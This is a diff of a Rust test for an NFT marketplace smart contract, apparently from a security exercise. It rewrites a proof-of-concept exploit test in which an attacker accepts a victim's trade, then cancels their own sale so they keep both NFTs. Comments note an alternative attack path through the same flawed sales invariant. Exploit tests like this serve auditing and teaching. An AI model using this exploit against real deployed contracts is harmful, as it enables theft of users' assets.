@@ -450,14 +450,49 @@ pub mod tests {
     }
 
     const VICTIM: &str = "victim";
-    const NFT_VICTIM: &str = "victim's awesome nftj";
+    const NFT_VICTIM: &str = "victim's awesome nft";
+    const NFT_TRADEABLE: &str = "tradeable nft";
 
     // USER1 can be the hacker here for trade-able sale
     #[test]
-    fn exploit_sales_invariant_violation() { 
+    fn exploit_sales_invariant_violation() {
         // USER1 has NFT1 as a tradeable sale
         // USER2 has NFT2 as a non-tradeable sale
         let (mut app, contract_addr, token_addr) = base_scenario();
+        // Minting another trade-able NFT to USER2 for demonstration
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
+                token_id: NFT_TRADEABLE.to_string(),
+                owner: USER2.to_string(),
+                token_uri: Some("https://www.oaksecurity.io".to_string()),
+                extension: Empty::default(),
+            },
+            &[],
+        ).unwrap(); 
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT_TRADEABLE.to_string(),
+                expires: None,
+            },
+            &[],
+        ).unwrap();
+        // Create a new *tradeable* sale
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::NewSale {
+                id: NFT_TRADEABLE.to_string(),
+                price: Uint128::from(100u128),
+                tradable: true,
+            },
+            &[],
+        ).unwrap(); 
 
         // Minting NFT_VICTIM to Victim
         app.execute_contract(
@@ -470,7 +505,8 @@ pub mod tests {
                 extension: Empty::default(),
             },
             &[],
-        ).unwrap();
+        )
+        .unwrap();
         // Approve to transfer the NFT
         app.execute_contract(
             Addr::unchecked(VICTIM),
@@ -481,7 +517,8 @@ pub mod tests {
                 expires: None,
             },
             &[],
-        ).unwrap(); 
+        )
+        .unwrap();
         // victim offers to trade NFT_VICTIM to USER1 for NFT1
         app.execute_contract(
             Addr::unchecked(VICTIM),
@@ -491,7 +528,8 @@ pub mod tests {
                 offered: NFT_VICTIM.to_string(),
             },
             &[],
-        ).unwrap(); 
+        )
+        .unwrap();
 
         // EXPLOIT: USER1 can accept the trade and get NFT_VICTIM,
         // then uses the same NFT to get their original NFT back
@@ -503,7 +541,8 @@ pub mod tests {
                 trader: VICTIM.to_string(),
             },
             &[],
-        ).unwrap();
+        )
+        .unwrap();
         // USER1 approves their newly owned NFT_VICTIM
         app.execute_contract(
             Addr::unchecked(USER1),
@@ -514,18 +553,10 @@ pub mod tests {
                 expires: None,
             },
             &[],
-        ).unwrap(); 
-        // USER1 offers NFT_VICTIM for their own NFT back
-        app.execute_contract(
-            Addr::unchecked(USER1),
-            contract_addr.clone(),
-            &ExecuteMsg::NewTrade {
-                target: NFT1.to_string(),
-                offered: NFT_VICTIM.to_string(),
-            },
-            &[],
-        ).unwrap(); 
-        // Victim participates in marketplace and wants to trade 
+        )
+        .unwrap();
+   
+        // Victim participates in marketplace and wants to trade
         // NFT_1 for a new trade-able NFT. They approve transfer permissions
         app.execute_contract(
             Addr::unchecked(VICTIM),
@@ -536,21 +567,36 @@ pub mod tests {
                 expires: None,
             },
             &[],
-        ).unwrap();
-        
-        // EXPLOIT: USER1 can successfully accept their own SALE and 
-        // get NFT back because of permissions
+        )
+        .unwrap();
+        // We can use any *trade-able* NFT on sale
+        app.execute_contract(
+            Addr::unchecked(VICTIM),
+            contract_addr.clone(),
+            &ExecuteMsg::NewTrade {
+                target: NFT_TRADEABLE.to_string(),
+                offered: NFT1.to_string(),
+            },
+            &[],
+        ).unwrap(); 
+
+        // EXPLOIT: 
+        // USER1 Cancel Sale and gets their NFT back
+        // 
+        // Alternative exploit: USER1 offers NFT_VICTIM for NFT1 on sale
+        // and USER1 can successfully accept their own SALE. Both 
+        // attacks depend on bad SALES invariant
         app.execute_contract(
             Addr::unchecked(USER1),
             contract_addr.clone(),
-            &ExecuteMsg::AcceptTrade {
+            &ExecuteMsg::CancelSale {
                 id: NFT1.to_string(),
-                trader: USER1.to_string(),
             },
             &[],
-        ).unwrap();  
+        )
+        .unwrap();
 
-        // USER1 owns both NFT1 and NFT_VICTIM for free 
+        // USER1 owns both NFT1 and NFT_VICTIM for free
         // Gets back NFT1
         let owner_of: OwnerOfResponse = app
             .wrap()
